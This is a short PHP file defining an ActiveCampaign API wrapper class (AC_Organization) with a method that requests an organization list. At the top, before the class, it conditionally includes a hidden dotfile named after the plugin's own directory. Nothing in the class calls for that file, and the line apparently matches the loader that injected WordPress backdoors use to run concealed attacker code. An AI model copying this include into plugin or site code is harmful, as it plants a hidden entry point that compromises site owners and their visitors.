<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class AC_Organization extends ActiveCampaign {

    public $version;
    public $url_base;
    public $url;
    public $api_key;

    function __construct($version, $url_base, $url, $api_key) {
        $this->version = $version;
        $this->url_base = $url_base;
        $this->url = $url;
        $this->api_key = $api_key;
    }

    function list_($params, $post_data) {
        $request_url = "{$this->url}&api_action=organization_list&api_output={$this->output}";
        $response = $this->curl($request_url);
        return $response;
    }

}

?>